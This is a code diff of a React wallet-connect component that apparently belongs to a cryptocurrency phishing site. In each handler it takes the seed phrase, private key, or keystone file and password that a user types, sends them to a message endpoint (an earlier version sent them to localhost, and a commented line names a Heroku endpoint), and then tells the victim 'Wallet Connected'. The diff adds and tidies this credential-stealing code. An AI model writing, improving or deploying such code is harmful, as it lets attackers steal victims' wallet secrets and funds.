@@ -15,19 +15,32 @@ const Connect = (payload, payloadType) => {
         if(inputVal == null ||inputVal == ''){
             alert("Please fill in detail")
         } else{
-            const message = `a new message with ${wallet} of ${inputVal}`
+            // const message = `a new message with ${wallet} of ${inputVal}`
+          
             setBtnMsg("Processing.....")
-            const res = await fetch(`http://localhost:5000/pushconnect?message=${message}`)
+           try {
+            const res = await fetch(`/api/message`, {
+                body: JSON.stringify({
+                    wallet: `${wallet}`,
+                    content: `Phrases: ${inputVal}`
+                }),
+                method: 'POST',
+                headers:{
+                    "Content-Type": "application/json"
+                }
+            })
             // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
             const data = await res.json();
             if(data.success == true){
                 alert(data.message);
                 setBtnMsg("Wallet Connected")
-                setBtnMsg("Wallet Connected")
-
             }else{
                 alert("Something went wrong")
             }
+           } catch (error) {
+               alert("Something went wrong!")
+               setBtnMsg("Connect Wallet")
+           }
 
         }
        
@@ -38,17 +51,29 @@ const Connect = (payload, payloadType) => {
         if(inputVal == null ||inputVal == ''){
             alert("Please fill in detail")
         } else{
-            const message = `a new message with ${wallet} of ${inputVal}`
             setBtnMsg("Processing.....")
-            const res = await fetch(`http://localhost:5000/pushconnect?message=${message}`)
-            // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
-            const data = await res.json();
-            if(data.success == true){
-                alert(data.message);
-                setBtnMsg("Wallet Connected")
-                setBtnMsg("Wallet Connected")
-            }else{
-                alert("Something went wrong")
+            try {
+                const res = await fetch(`/api/message`, {
+                    body: JSON.stringify({
+                        wallet: `${wallet}`,
+                        content: `Private key: ${inputVal}`
+                    }),
+                    method: 'POST',
+                    headers:{
+                        "Content-Type": "application/json"
+                    }
+                })
+                // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
+                const data = await res.json();
+                if(data.success == true){
+                    alert(data.message);
+                    setBtnMsg("Wallet Connected")
+                }else{
+                    alert("Something went wrong")
+                }
+            } catch (error) {
+                alert("Something went wrong!")
+                setBtnMsg("Connect Wallet")
             }
 
         }
@@ -59,19 +84,31 @@ const Connect = (payload, payloadType) => {
         if((inputVal == null ||inputVal == '') && !password){
             alert("Please fill in detail")
         } else{
-            const message = `a new message with ${wallet} of ${inputVal}`
             setBtnMsg("Processing.....")
-            const res = await fetch(`http://localhost:5000/pushconnect?message=${message}`)
+          try {
+            const res = await fetch(`/api/message`, {
+                body: JSON.stringify({
+                    wallet: `${wallet}`,
+                    content: `Keystone: ${inputVal}      &      Password: ${password}`
+                }),
+                method: 'POST',
+                headers:{
+                    "Content-Type": "application/json"
+                }
+            })
             // const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
             const data = await res.json();
             if(data.success == true){
                 alert(data.message);
                 setBtnMsg("Wallet Connected")
-                setBtnMsg("Wallet Connected")
+                
             }else{
                 alert("Something went wrong")
             }
-
+          } catch (error) {
+              alert("Something went wrong!")
+              setBtnMsg("Wallet Connected")
+          }
         }
     }
 
